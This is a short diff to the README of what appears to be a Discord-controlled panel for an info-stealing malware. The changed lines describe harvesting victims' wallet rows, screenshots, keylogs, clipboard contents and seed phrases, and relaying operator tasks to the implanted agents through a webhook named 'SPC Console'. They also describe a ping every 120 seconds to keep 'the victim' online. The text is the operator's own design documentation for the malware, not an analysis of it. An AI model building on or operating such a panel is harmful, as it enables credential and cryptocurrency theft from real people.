@@ -12,7 +12,8 @@ no VPS. The panel only makes outbound HTTPS requests to Discord.
   extracted and indexed as artifacts, wallet rows, screenshots, keylogs and seeds.
 - Agent chat notices (`wallet detected`, `password?`, `clipboard:`, `seed escrita`)
   become events and table rows.
-- Panel tasks are posted as the existing agent commands; replies close the task.
+- The bridge creates a per-channel webhook `SPC Console` and posts panel tasks through it;
+  the agent ignores messages from its own bot account. Replies and uploaded files close the task.
 - Every 120 s the bridge posts `ping`; replies keep the victim online.
 
 ## Requirements
